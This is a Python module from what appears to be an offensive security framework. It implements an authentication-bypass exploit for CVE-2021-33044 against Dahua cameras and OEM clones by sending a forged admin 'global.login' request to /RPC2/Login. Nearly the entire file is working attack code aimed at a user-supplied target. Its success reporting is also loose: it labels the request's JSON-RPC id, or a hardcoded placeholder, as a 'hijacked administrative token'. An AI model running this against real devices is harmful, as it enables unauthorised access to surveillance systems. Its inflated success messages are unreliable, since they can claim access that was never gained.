import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dahua/cve_2021_33044_attack"
        self.description = "Authentication bypass exploit engine targeting Dahua devices and OEM clones (CVE-2021-33044)."
        self.type = "attack"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/RPC2/Login"
        else:
            url = f"{target.rstrip('/')}/RPC2/Login"
            
        headers = {"Content-Type": "application/json"}
        
        # Étape 1 : Envoi de la requête forgée initiale pour usurper l'identité de l'administrateur
        payload = {
            "method": "global.login",
            "params": {
                "userName": "admin",
                "loginType": "Direct",
                "clientType": "Web3.0"
            },
            "id": 1
        }
        
        try:
            async with httpx.AsyncClient(timeout=8.0, verify=False) as client:
                print("\033[1;33m[*] Sending forged JSON authentication challenge to Dahua endpoint...\033[0m")
                response = await client.post(url, json=payload, headers=headers)
                
                if response.status_code == 200 and "result" in response.text:
                    data = response.json()
                    session_id = data.get("id") or "GeneratedSessionID"
                    
                    return {
                        "success": True,
                        "details": (
                            f"Dahua authentication bypass successfully executed!\n"
                            f"  -> Administrative Token Hijacked: {session_id}\n"
                            f"  -> Access Level Granted: admin (full privilege cluster control bypass)"
                        )
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}
        return {"success": False, "details": "Target system processed the inputs but validation layers did not yield session assets."}
